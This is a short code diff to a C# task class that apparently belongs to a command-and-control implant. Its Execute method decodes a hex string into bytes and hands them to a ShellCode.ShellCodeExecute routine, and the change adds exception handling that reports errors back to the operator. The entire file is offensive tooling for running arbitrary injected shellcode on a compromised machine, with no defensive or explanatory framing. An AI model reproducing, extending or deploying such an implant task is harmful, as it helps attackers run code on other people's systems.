@@ -6,19 +6,23 @@ public static class Task
 {
     public static string Execute(string hex)
     {
-        byte[] bytes = new byte[hex.Length / 2];
-        for (int i = 0; i < hex.Length; i += 2)
+        try
         {
-            bytes[i/2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            byte[] bytes = new byte[hex.Length / 2];
+            for (int i = 0; i < hex.Length; i += 2)
+            {
+                bytes[i/2] = Convert.ToByte(hex.Substring(i, 2), 16);
+            }
+            
+            if (ShellCode.ShellCodeExecute(bytes))
+            {
+                return "ShellCode execution succeeded.";
+            }
+            else
+            {
+                return "ShellCode execution failed.";
+            }
         }
-        
-        if (ShellCode.ShellCodeExecute(bytes))
-        {
-            return "ShellCode execution succeeded.";
-        }
-        else
-        {
-            return "ShellCode execution failed.";
-        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
     }
 }
